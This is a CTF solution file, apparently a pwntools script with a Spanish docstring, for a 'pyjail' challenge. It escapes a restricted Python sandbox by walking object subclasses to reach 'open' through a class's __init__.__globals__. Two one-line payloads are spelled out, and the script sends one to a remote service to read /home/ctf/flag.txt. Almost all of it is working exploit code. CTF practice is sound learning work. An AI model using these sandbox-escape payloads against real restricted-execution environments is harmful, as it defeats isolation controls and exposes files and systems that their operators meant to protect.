"""
Solución: medium-misc-pyjail

Ruta de escape: introspección de la jerarquía de clases de Python.

Aunque los builtins están restringidos, la introspección de objetos funciona:

  ().__class__.__base__.__subclasses__()
  → retorna todas las subclases de 'object' cargadas en el intérprete

Buscamos una cuyo __init__.__globals__ contenga 'open' o '__builtins__' con 'open'.

Payload confiable (una sola línea para el jail):
  [c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['open']('/home/ctf/flag.txt').read()

Alternativa (funciona en CPython 3.11):
  [c for c in ().__class__.__base__.__subclasses__() if hasattr(c,'__init__') and hasattr(c.__init__,'__globals__') and 'open' in c.__init__.__globals__][0].__init__.__globals__['open']('/home/ctf/flag.txt').read()

Nota: '_wrap_close' es el wrapper del módulo io, siempre cargado al iniciar Python.
"""
from pwn import *
import re

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 9999)

p = remote(HOST, PORT)
p.recvuntil(b'>>> ')

# Payload: buscar clase con 'open' en su __init__.__globals__
payload = (
    b"[c for c in ().__class__.__base__.__subclasses__() "
    b"if hasattr(c,'__init__') and hasattr(c.__init__,'__globals__') "
    b"and 'open' in c.__init__.__globals__]"
    b"[0].__init__.__globals__['open']('/home/ctf/flag.txt').read()"
)

p.sendline(payload)
output = p.recvline(timeout=5).decode(errors='replace').strip()
print(f"[+] Resultado: {output}")

# Extraer la flag del repr retornado
flag = re.sub(r"^'|'$", '', output)
if flag.startswith('CTF{') or flag.startswith('HackL4bs{'):
    print(f"[+] FLAG: {flag}")
else:
    print(f"[?] Revisar salida completa arriba")
